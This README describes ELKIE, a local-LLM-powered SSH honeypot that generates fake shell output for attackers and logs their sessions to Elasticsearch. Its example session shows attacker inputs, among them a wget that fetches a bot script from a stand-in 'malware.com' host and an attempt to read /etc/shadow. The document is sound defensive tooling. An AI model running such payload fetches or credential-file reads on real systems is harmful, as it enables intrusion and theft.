# ELKIE Local LLM Honeypot

High-interaction SSH honeypot powered by local LLM inference - **no API costs!**

## Overview

This module adds AI-powered response generation to your T-Pot honeypot deployment. Instead of using static responses, the honeypot uses a locally-running LLM (via Ollama) to generate realistic shell output that keeps attackers engaged longer.

### Features

- **Zero API Costs**: All inference runs locally on your CPU
- **High Interaction**: Dynamic responses to any command attackers try
- **Response Caching**: Common commands are cached for instant responses
- **Session Context**: LLM remembers previous commands in the session
- **Full Logging**: All sessions and commands logged for analysis
- **Elasticsearch Integration**: Seamlessly integrates with your ELKIE monitoring

## Hardware Requirements

Optimized for your system:
- **Dual Xeon Platinum 8168** (48 cores/96 threads) - Excellent for CPU inference
- **96GB RAM** - Can run multiple models simultaneously
- **No GPU Required** - Pure CPU inference

### Model Performance Estimates

| Model | RAM Usage | Response Time | Quality |
|-------|-----------|---------------|---------|
| Phi 2.7B | ~4GB | 1-3 sec | Good |
| Neural Chat 7B | ~8GB | 3-8 sec | Better |
| Mistral 7B | ~8GB | 3-8 sec | Best |
| Llama 2 13B | ~16GB | 8-15 sec | Highest |

With your 48 cores, expect response times on the lower end of these ranges.

## Quick Start

```bash
# Navigate to the LLM honeypot directory
cd /home/user/ELKIE/scripts/llm-honeypot

# Run the setup script
./setup.sh

# Test it!
ssh root@localhost -p 8022
# Password: root
```

## Architecture

```
┌─────────────────────────────────────────────────────────────────┐
│                     Attacker                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼ SSH (port 8022)
┌─────────────────────────────────────────────────────────────────┐
│                  Cowrie LLM Responder                           │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ SSH Server   │──│ Session Mgr  │──│ LLM Client   │          │
│  │ (asyncssh)   │  │              │  │              │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
└─────────────────────────────────────────────────────────────────┘
          │                                    │
          ▼                                    ▼
┌──────────────────┐                ┌──────────────────────┐
│     Redis        │                │      Ollama          │
│  (Response Cache)│                │  (Local LLM Server)  │
│                  │                │                      │
│  - Session state │                │  - Mistral 7B        │
│  - Cached output │                │  - CPU inference     │
│  - Rate limiting │                │  - 48 threads        │
└──────────────────┘                └──────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│                    Elasticsearch                                 │
│  ┌──────────────┐  ┌──────────────┐  ┌──────────────┐          │
│  │ sessions.jsonl│ │commands.jsonl│  │ yara-matches │          │
│  └──────────────┘  └──────────────┘  └──────────────┘          │
└─────────────────────────────────────────────────────────────────┘
          │
          ▼
┌─────────────────────────────────────────────────────────────────┐
│                      Grafana                                     │
│            (honeypot-grafana-dashboard.json)                    │
└─────────────────────────────────────────────────────────────────┘
```

## Response Strategy

The system uses a tiered response strategy for optimal performance:

1. **Static Responses** (instant) - Common commands like `whoami`, `id`, `pwd`
2. **Cached Responses** (~1ms) - Previously generated responses from Redis
3. **LLM Generation** (3-8 sec) - Novel commands generate unique responses

### Example Session

```
$ ssh root@honeypot -p 8022
root@honeypot's password: root

Welcome to Ubuntu 22.04.3 LTS (5.15.0-91-generic)
Last login: Wed Dec 18 10:30:45 2024 from 192.168.1.100

root@ubuntu-server-01:~# whoami
root

root@ubuntu-server-01:~# ls -la
total 32
drwx------  5 root root 4096 Dec 15 14:22 .
drwxr-xr-x 23 root root 4096 Nov  8 09:14 ..
-rw-------  1 root root 1247 Dec 15 14:22 .bash_history
-rw-r--r--  1 root root 3106 Oct 15 17:46 .bashrc
drwx------  2 root root 4096 Nov  8 09:30 .ssh
-rw-r--r--  1 root root  161 Jul  9  2019 .profile

root@ubuntu-server-01:~# cat /etc/shadow
cat: /etc/shadow: Permission denied

root@ubuntu-server-01:~# wget http://malware.com/bot.sh
--2024-12-18 14:35:22--  http://malware.com/bot.sh
Resolving malware.com (malware.com)... 93.184.216.34
Connecting to malware.com (malware.com)|93.184.216.34|:80... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4523 (4.4K) [text/x-sh]
Saving to: 'bot.sh'

bot.sh              100%[===================>]   4.42K  --.-KB/s    in 0s

2024-12-18 14:35:23 (45.2 MB/s) - 'bot.sh' saved [4523/4523]
```

## Configuration

Edit `config.yml` to customize:

```yaml
server:
  ssh_port: 8022
  hostname: "ubuntu-server-01"

llm:
  model: "mistral:7b-instruct-v0.2-q4_K_M"
  temperature: 0.7
  max_tokens: 512

credentials:
  root:
    - "root"
    - "password"
    - "123456"
```

## Integration with T-Pot

To use this with your existing T-Pot installation:

### Option 1: Replace Cowrie

```bash
# Stop the default Cowrie in T-Pot
docker stop cowrie

# Redirect port 22 to the LLM honeypot
iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 8022
```

### Option 2: Run Alongside

Run on a different port and configure your firewall to route some traffic to each:

```bash
# LLM honeypot on 8022
# Original Cowrie on 2222
# Split traffic based on source IP ranges
```

### Option 3: Proxy Mode

Configure Cowrie to proxy complex commands to the LLM responder.

## Logs and Monitoring

### Log Files

- `sessions.jsonl` - Login attempts, session start/end
- `commands.jsonl` - All commands and responses

### Filebeat Integration

Add to your Filebeat config to ingest logs into Elasticsearch:

```yaml
filebeat.inputs:
  - type: filestream
    id: honeypot-llm-sessions
    paths:
      - /var/log/cowrie-llm/sessions.jsonl
    parsers:
      - ndjson:
          keys_under_root: true

  - type: filestream
    id: honeypot-llm-commands
    paths:
      - /var/log/cowrie-llm/commands.jsonl
    parsers:
      - ndjson:
          keys_under_root: true
```

## Performance Tuning

### For Your Xeon Platinum 8168

The setup is already optimized for your hardware:

```yaml
# In docker-compose.yml
environment:
  - OLLAMA_NUM_THREAD=48      # Use all cores
  - OLLAMA_NUM_PARALLEL=4     # Handle 4 concurrent requests
```

### Memory Allocation

With 96GB RAM, you can comfortably run:
- Ollama with Mistral 7B: ~12GB
- Redis cache: ~2GB
- Cowrie responder: ~1GB
- **Remaining for OS and T-Pot**: ~80GB

## Security Considerations

1. **Network Isolation**: Run the honeypot on an isolated network segment
2. **No Real Secrets**: Never put real credentials in the config
3. **Monitor Resource Usage**: Attackers may try to exhaust resources
4. **Regular Log Review**: Check for interesting attack patterns

## Troubleshooting

### Slow Responses

```bash
# Check Ollama is using all CPU cores
docker exec honeypot-ollama top -H

# Monitor response times
tail -f /var/log/cowrie-llm/commands.jsonl | jq '.response_latency_ms'
```

### Model Not Loading

```bash
# Check Ollama logs
docker logs honeypot-ollama

# Manually pull model
docker exec honeypot-ollama ollama pull mistral:7b-instruct-v0.2-q4_K_M
```

### Redis Connection Issues

```bash
# Test Redis connectivity
docker exec honeypot-redis redis-cli ping
```

## Files

```
scripts/llm-honeypot/
├── docker-compose.yml          # Full service stack
├── Dockerfile.responder        # Honeypot container build
├── config.yml                  # Configuration
├── requirements.txt            # Python dependencies
├── setup.sh                    # Setup script
├── llm_client.py              # LLM communication library
├── cowrie_llm_responder.py    # Main honeypot server
├── prompts/
│   ├── system.txt             # System prompt for LLM
│   └── commands.json          # Command-specific prompts
├── logs/                      # Local log storage
└── README.md                  # This file
```

## License

Part of the ELKIE Honeypot Monitoring System.
